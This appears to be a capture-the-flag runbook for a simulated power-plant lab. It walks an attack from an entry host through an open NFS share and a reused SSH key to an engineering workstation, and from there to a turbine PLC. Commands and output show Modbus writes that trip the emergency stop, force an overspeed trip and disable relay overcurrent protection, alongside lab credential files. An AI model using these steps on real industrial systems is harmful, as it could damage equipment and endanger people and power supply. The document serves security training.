# Runbook: admin-home pivot to control zone

Two-hop attack chain from internet entry to the engineering workstation, then to the
turbine PLC. This is the intended entry path for the "access and persistence" scenario:
one weak home machine hands an attacker the keys to the entire control network.

- Techniques: 
  - [Credential attacks and authentication abuse](https://purple.tymyrddin.dev/docs/ctfs/ot-ics/attack-surface#credential-attacks-and-authentication-abuse)
  - [Trust exploitation and misconfiguration](https://purple.tymyrddin.dev/docs/ctfs/ot-ics/attack-surface#trust-exploitation-and-misconfiguration-abuse)
  - [IT/OT boundary crossing](https://purple.tymyrddin.dev/docs/ctfs/ot-ics/attack-surface#initial-access-and-lateral-movement-through-the-it-ot-boundary)
  - [Process intelligence gathering](https://purple.tymyrddin.dev/docs/ctfs/ot-ics/attack-surface#process-intelligence-gathering)
  - [Unauthorised state manipulation](https://purple.tymyrddin.dev/docs/ctfs/ot-ics/attack-surface#unauthorised-state-manipulation)
- Challenge type: Realist
- Difficulty: Intermediate

## Components to start

```bash
./ctl up
sudo ./ctl firewall
```

Minimal containers: `unseen-gate`, `wizzards-retreat`, `uupl-eng-ws`, `hex-turbine-plc`

Add `uupl-mqtt` to observe MQTT telemetry in Stage 4. The firewall is required for
realistic network segmentation between zones.

Entry: `./ctl ssh ponder` (or `ssh ponder@localhost -p 2222` for local dev).

```bash
$ ./ctl ssh ponder
[ctl] Connecting as ponder@localhost:2222 ...
Warning: Permanently added '[localhost]:2222' (ED25519) to the list of known hosts.
Linux unseen-gate 6.8.0-107-generic #107-Ubuntu SMP PREEMPT_DYNAMIC Fri Mar 13 19:51:50 UTC 2026 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
```

## Attack path

### Stage 0: identify the target

```bash
# Read the mission briefing on unseen-gate
ponder@unseen-gate:~$ ls
README  loot
ponder@unseen-gate:~$ cat README
You have obtained access to this host.
You are on the city network (10.10.0.0/24).

Unseen University Power & Light Co. operates somewhere beyond.
Their infrastructure is old. Their documentation, sparse.
Their security posture: emergent.
Their network is not directly reachable from here.

Other things are on this network. Check your ~/loot directory.

Tools available on this host:
  nmap, hydra, smbclient, ftp, socat, tcpdump, curl, wget, showmount, mount
  Python: /opt/attacker-env/bin/python3
    libs: pymodbus, paramiko, impacket
```

Checking that loot directory left behind:

```bash
ponder@unseen-gate:~$ cd loot
ponder@unseen-gate:~/loot$ ls
prior-recon.txt
ponder@unseen-gate:~/loot$ cat prior-recon.txt 
# Recon notes — prior engagement fragment
# Do not leave on shared systems.
10.10.0.5  ponders-machine  open: 22/tcp
10.10.0.10 wizzards-retreat open: 22/tcp 111/tcp 2049/tcp
-- last updated by previous team
```

Confirm what is running on ponders-machine:

```bash
ponder@unseen-gate:~/loot$ nmap -sV 10.10.0.5 
Starting Nmap 7.93 ( https://nmap.org ) at 2026-04-16 07:46 UTC
Nmap scan report for unseen-gate (10.10.0.5)
Host is up (0.000089s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 9.2p1 Debian 2+deb12u9 (protocol 2.0)
111/tcp open  rpcbind 2-4 (RPC #100000)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.35 seconds
```
Oh. Aha!

```bash
ponder@unseen-gate:~/loot$ hostname -I
10.10.0.5
```

```bash
ponder@unseen-gate:~/loot$ nmap -sV 10.10.0.10
Starting Nmap 7.93 ( https://nmap.org ) at 2026-04-16 07:37 UTC
Nmap scan report for admin-home.ics_internet (10.10.0.10)
Host is up (0.00017s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u9 (protocol 2.0)
111/tcp  open  rpcbind 2-4 (RPC #100000)
2049/tcp open  nfs     3 (RPC #100003)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.60 seconds
```

### Stage 1: compromise wizzards-retreat

OSINT from the attacker machine

```bash
ponder@unseen-gate:~$ cat ~/loot/prior-recon.txt
# Recon notes — prior engagement fragment
# Do not leave on shared systems.
10.10.0.5  ponders-machine  open: 22/tcp
10.10.0.10 wizzards-retreat open: 22/tcp 111/tcp 2049/tcp
-- last updated by previous team
```

Brute-force or try SSH weak password (Password hint: wizzard):

```bash
ponder@unseen-gate:~/loot$ ssh rincewind@10.10.0.10
Password:
The authenticity of host '10.10.0.10 (10.10.0.10)' can't be established.
ED25519 key fingerprint is SHA256:Y0Y3WvWKxe/QXsTYNklTrqHzfeZdakXD4VQoDEmCSXE.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.0.10' (ED25519) to the list of known hosts.
rincewind@10.10.0.10's password: 
Linux wizzards-retreat 6.8.0-107-generic #107-Ubuntu SMP PREEMPT_DYNAMIC Fri Mar 13 19:51:50 UTC 2026 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
rincewind@wizzards-retreat:~$ 
```

NFS anonymous mount (world-readable share, no credentials required), then SSH with key:

```bash
showmount -e 10.10.0.10
# Export list for 10.10.0.10:
# /work *
```

Mount it:

```text
ponder@unseen-gate:~$ mkdir /tmp/loot
ponder@unseen-gate:~$ sudo mount -t nfs -o vers=3 10.10.0.10:/work /tmp/loot
ponder@unseen-gate:~$ cd /tmp/loot
ponder@unseen-gate:/tmp/loot$ ls
notes.txt  rincewind_id_ed25519
ponder@unseen-gate:/tmp/loot$ cat notes.txt
Network access notes — DO NOT leave on shared systems
======================================================

VPN connects automatically on login. Config: ~/.vpn/uupl-vpn.conf

Engineering workstation: 10.10.2.30
  ssh -i ~/.ssh-keys/uupl_eng_key engineer@10.10.2.30

Historian web: http://10.10.2.10:8080
  (ask Stibbons for credentials if you need them)

SCADA web: http://10.10.2.20:8080
  admin/admin — yes really, IT said they'd fix it in the next maintenance window

Legacy system: 10.10.1.10
  FTP anonymous read works, SMB share is open
  The old engineer logbook is somewhere in there

Remember to disconnect VPN when done.
```

Copy keys and ssh into `10.10.0.10`:

```text
ponder@unseen-gate:/tmp/loot$ cp rincewind_id_ed25519 ~/.ssh/
ponder@unseen-gate:/tmp/loot$ chmod 600 ~/.ssh/rincewind_id_ed25519
ponder@unseen-gate:/tmp/loot$ ssh -i ~/.ssh/rincewind_id_ed25519 rincewind@10.10.0.10
The authenticity of host '10.10.0.10 (10.10.0.10)' can't be established.
ED25519 key fingerprint is SHA256:S4y9XqCLdmr8QwHcN3qEA81n9NT7UVyom+FBG6GkuhM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.0.10' (ED25519) to the list of known hosts.
Linux wizzards-retreat 6.8.0-107-generic #107-Ubuntu SMP PREEMPT_DYNAMIC Fri Mar 13 19:51:50 UTC 2026 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
rincewind@wizzards-retreat:~$
```

### Stage 2: pivot to the engineering workstation

Aha! Notes. Read the notes.

```text
rincewind@wizzards-retreat:~$ cat ~/notes.txt
Network access notes — DO NOT leave on shared systems
======================================================

VPN connects automatically on login. Config: ~/.vpn/uupl-vpn.conf

Engineering workstation: 10.10.2.30
  ssh -i ~/.ssh-keys/uupl_eng_key engineer@10.10.2.30

Historian web: http://10.10.2.10:8080
  (ask Stibbons for credentials if you need them)

SCADA web: http://10.10.2.20:8080
  admin/admin — yes really, IT said they'd fix it in the next maintenance window

Legacy system: 10.10.1.10
  FTP anonymous read works, SMB share is open
  The old engineer logbook is somewhere in there

Remember to disconnect VPN when done.
```

Interesting finds. Confirm the key:

```bash
rincewind@wizzards-retreat:~$ ls ~/.ssh-keys/
uupl_eng_key  uupl_eng_key.pub
```

And that VPN connects automatically on login. Read the VPN config:

```bash
rincewind@wizzards-retreat:~$ cat ~/.vpn/uupl-vpn.conf
# UU P&L Remote Access VPN
# Provisioned by UU IT Operations, Ankh-Morpork
# Contact: Ponder Stibbons (p.stibbons@uupl.ank) for access issues
# DO NOT SHARE — personal VPN configuration

[Interface]
PrivateKey = 4K9mXpLqZRfNjH2WsVtB8aYeG0CdIuOw9x3nP6TkMoE=
Address = 10.10.1.3/24
DNS = 10.10.1.1

[Peer]
PublicKey = wHvDzRBxZ6K8n+KjCmJvFLqvOGSNQ2pZ3FS0VBuYMFE=
AllowedIPs = 10.10.1.0/24, 10.10.2.0/24
Endpoint = vpn.uupl.ank:51820
PersistentKeepalive = 25
```

SSH into the engineering workstation:

```bash
rincewind@wizzards-retreat:~$ ssh -i ~/.ssh-keys/uupl_eng_key engineer@10.10.2.30
```

![Engineering workstation welcome screen](/_static/images/simlab-engineering-workstation.png)

### Stage 3: engineering workstation

```text
# Read every control zone credential in one file
PS C:\Users\engineer> type config\plc-access.conf
# UU P&L — PLC and IED Access Configuration
# Written: 2001-09-03  Author: Ponder Stibbons
# Updated: 2023-06-14  (actuators added; relay web UIs documented)
#
# Format: device, ip, port, protocol, unit_id, notes
# Modbus TCP has no authentication. The network IS the access control.
#
# ICS Process: uupl_ied
# Control network: 10.10.3.0/24

[hex_turbine_controller]
ip       = 10.10.3.21
port     = 502
protocol = modbus-tcp
unit_id  = 1
notes    = Main turbine PLC. Coil 0 = emergency stop.
           Also: DNP3 :20000, IEC-104 :2404, SNMP :161 (community: public)
           DO NOT write coil 0 without coordination with the duty engineer.

[hmi_main]
ip       = 10.10.3.10
port     = 502
protocol = modbus-tcp
unit_id  = 1
notes    = Operator HMI. Modbus mirror of PLC state; writes forwarded to PLC.
           SSH: operator@10.10.3.10 password: operator (restricted shell)
           Web: http://10.10.3.10:8080/ login: operator/operator

[ied_relay_a]
ip       = 10.10.3.31
port     = 502
protocol = modbus-tcp
unit_id  = 1
notes    = Protective relay, Feeder A (Dolly Sisters). HR[0-2] = protection thresholds.
           Web: http://10.10.3.31:8081/ login: admin/relay1234
           SNMP: community public (read), private (read-write)

[ied_relay_b]
ip       = 10.10.3.32
port     = 502
protocol = modbus-tcp
unit_id  = 1
notes    = Protective relay, Feeder B (Nap Hill). HR[0-2] = protection thresholds.
           Web: http://10.10.3.32:8081/ login: admin/relay1234
           SNMP: community public (read), private (read-write)

[ied_meter_main]
ip       = 10.10.3.33
port     = 502
protocol = modbus-tcp
unit_id  = 1
notes    = Revenue meter — read-only input registers. Report discrepancies to the Bursar.
           SNMP: community public (read)

[actuator_fuel_valve]
ip       = 10.10.3.51
port     = 502
protocol = modbus-tcp
unit_id  = 1
notes    = Fuel valve actuator. HR[0] = position 0-100%. Written by PLC governor loop.

[actuator_cooling_pump]
ip       = 10.10.3.52
port     = 502
protocol = modbus-tcp
unit_id  = 1
notes    = Cooling pump. HR[0] = speed 0-100%. Default: 100%.

[actuator_breaker_a]
ip       = 10.10.3.53
port     = 502
protocol = modbus-tcp
unit_id  = 1
notes    = Feeder A circuit breaker. Coil[0]=state, coil[1]=trip, coil[2]=close.
           Written by relay IED on fault. DO NOT trip without coordination.

[actuator_breaker_b]
ip       = 10.10.3.54
port     = 502
protocol = modbus-tcp
unit_id  = 1
notes    = Feeder B circuit breaker. Coil[0]=state, coil[1]=trip, coil[2]=close.
           Written by relay IED on fault. DO NOT trip without coordination.
```

```bash
PS C:\Users\engineer> cat plc_poll.log
poll_and_ingest: rpm=2997 temp=308 press=86 volt_a=231 curr_a=229 [ok, 9/9 ingested]
poll_and_ingest: rpm=3001 temp=309 press=86 volt_a=232 curr_a=230 [ok, 9/9 ingested]
poll_and_ingest: rpm=2998 temp=308 press=85 volt_a=231 curr_a=229 [ok, 9/9 ingested]
```

```bash
PS C:\Users\engineer> type Documents\engineering_notes.txt
Misc engineering notes — please do not delete
=============================================
Last updated: 2026-01-08  P. Stibbons

PLC access: see config\plc-access.conf
PLC project files: see Projects\PLC\turbine_controller.project

Historian:
  http://10.10.2.10:8080/report?asset=turbine_rpm&from=2026-01-01&to=2026-02-01
  DB credentials: historian / Historian2015  (never changed — "it's fine")

SCADA:
  http://10.10.2.20:8080/  login: admin / admin
  SSH:  scada_admin@10.10.2.20  password: W1nd0ws@2016
  Config dump: http://10.10.2.20:8080/config  (same creds as web)

Historian SSH:
  hist_admin@10.10.2.10  password: same as DB password

Relay IED web interfaces:
  http://10.10.3.31:8081/  admin/relay1234  (Dolly Sisters, Feeder A)
  http://10.10.3.32:8081/  admin/relay1234  (Nap Hill, Feeder B)
  NOTE: Modbus HR[0-2] are writable and control trip thresholds.
        See relay_a_2019.txt for register map.

HMI:
  SSH: operator@10.10.3.10  password: operator
  Web: http://10.10.3.10:8080/  operator/operator

Emergency contact: Ponder Stibbons ext 201, Igor ext 333 (out-of-hours)
```

### Stage 4: turbine PLC, read and manipulate

The engineering workstation has a control zone NIC at 10.10.3.100. All control zone
devices are directly reachable from here.

```bash
PS C:\Users\engineer> python Tools\modbus_read.py 10.10.3.21 502 input 0 11
[2909, 168, 83, 223, 72, 221, 73, 484, 30, 15, 13]
```

`IR[0]=RPM`, `IR[1]=temp_C`, `IR[2]=pressure_bar`, `IR[3]/[4]=voltage_a/b`,
`IR[5]/[6]=current_a/b`, `IR[7]=freq_x10`, `IR[8]=power_W`, `IR[9]=oil`, `IR[10]=vibration`

```bash
PS C:\Users\engineer> python Tools\modbus_read.py 10.10.3.21 502 holding 0 4
[0, 98, 200, 0]
```

`HR[0]=governor_setpoint_RPM`, `HR[1]=fuel_valve%`, `HR[2]=cooling_pump%`, `HR[3]=oc_threshold`

Trip the turbine via emergency stop coil:

```bash
PS C:\Users\engineer> python Tools\modbus_write.py 10.10.3.21 502 coil 0 1
Written 1 to coil[0] on 10.10.3.21:502
```

Overspeed trip is stealthier. It looks like a protection event rather than a direct stop:

```bash
PS C:\Users\engineer> python Tools\modbus_write.py 10.10.3.21 502 holding 0 4000
Written 4000 to holding[0] on 10.10.3.21:502
PS C:\Users\engineer> python Tools\modbus_read.py 10.10.3.21 502 holding 0 4
[4000, 0, 200, 0]
```

Governor setpoint raised to 4000 RPM, above the 3300 RPM overspeed threshold.

For relay manipulation, disable overcurrent protection on feeder A:

```bash
PS C:\Users\engineer> python Tools\modbus_write.py 10.10.3.31 502 holding 2 0
Written 0 to holding[2] on 10.10.3.31:502
```

`relay_a HR[2]` is the overcurrent threshold; 0 trips on any measurable current.

## Flag placement

Place the flag in a file on the engineering workstation at
`C:\Users\engineer\Documents\flag.txt` or in a register the participant reads after
successfully tripping the turbine. For a register-based flag, write it to IR[10] in
`plc_server.py` when the estop coil goes high.

For a credential-chain challenge, embed the flag in `config\plc-access.conf` behind
a comment that only appears after SSHing in: `# flag: RM{...}`.

## In one line

`unseen-gate` → `wizzards-retreat` (keys or weak SSH password) → Ed25519 key →
`engineering workstation` (direct key login) → `plc-access.conf` →
turbine PLC emergency stop.

Total credential use: one password (`wizzard`) if taking the SSH path; zero credentials if
taking the NFS path to the notes file. Everything else follows from the key.

## TL;DR

Rincewind's home machine is the weakest link in a chain that ends at a turbine PLC.
No vulnerability exploitation, no zero-days. A world-readable NFS share hands out network
notes to anyone who asks, and the engineering workstation's authorised key list includes a
key stored in a home directory on a share. That is the problem.